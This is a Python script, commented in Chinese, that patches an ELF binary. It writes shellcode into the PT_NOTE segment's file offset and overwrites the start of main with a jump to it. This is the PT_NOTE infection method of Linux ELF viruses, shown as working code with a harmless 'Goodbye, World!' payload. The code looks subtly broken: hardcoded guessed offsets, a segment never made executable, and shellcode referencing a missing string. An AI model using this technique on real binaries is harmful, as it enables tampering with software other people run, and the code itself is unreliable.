import struct

# 在 .text 段的起始处插入一个 jmp 到 PT_NOTE 段的虚拟地址
def inject_jmp_to_ptnote(fd, text_offset, note_vaddr, base_vaddr):
    """
    在 .text 段插入 jmp 指令跳转到 PT_NOTE 段的地址
    :param fd: 文件描述符
    :param text_offset: .text 段的文件偏移地址
    :param note_vaddr: PT_NOTE 段的虚拟地址
    :param base_vaddr: 基地址（.text 段的虚拟地址）
    """
    fd.seek(text_offset)
    # 计算从 .text 段跳转到 PT_NOTE 段的相对偏移
    jump_offset = note_vaddr - (base_vaddr + 5)  # 5 是 jmp 指令长度
    # 创建 jmp 指令
    jmp_instr = b'\xE9' + struct.pack('<I', jump_offset & 0xFFFFFFFF)
    fd.write(jmp_instr)

def inject_shellcode(fd, target_offset, shellcode):
    """
    将 shellcode 写入到目标文件偏移。
    :param fd: 文件描述符
    :param target_offset: 目标文件偏移
    :param shellcode: 要注入的 shellcode
    """
    fd.seek(target_offset)
    fd.write(shellcode)

def infect_elf(file_path):
    """
    修改 ELF 文件，将 jmp 插入到 .text 段并跳转到 PT_NOTE 段
    同时注入 shellcode。
    :param file_path: ELF 文件路径
    """
    with open(file_path, 'rb+') as fd:
        # .text 段的偏移和基地址，假设我们要修改 main 函数开头
        text_offset = 0x1175  # .load 段的文件偏移
        text_vaddr = 0x1175  # .load 段的虚拟地址 (假设)

        # PT_NOTE 段的虚拟地址
        note_vaddr = 0x338  # 假设 PT_NOTE 段的虚拟地址

        # shellcode: 输出 "Goodbye, World!"
        shellcode = b"\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x8d\x35\x0a\x00\x00\x00\x48\xc7\xc2\x10\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05"

        # 注入 shellcode 到 PT_NOTE 段的文件偏移
        inject_shellcode(fd, 0x338, shellcode)

        # 在 .text 段插入 jmp 到 PT_NOTE 段
        inject_jmp_to_ptnote(fd, text_offset, note_vaddr, text_vaddr)

# 使用例子
infect_elf('hello')
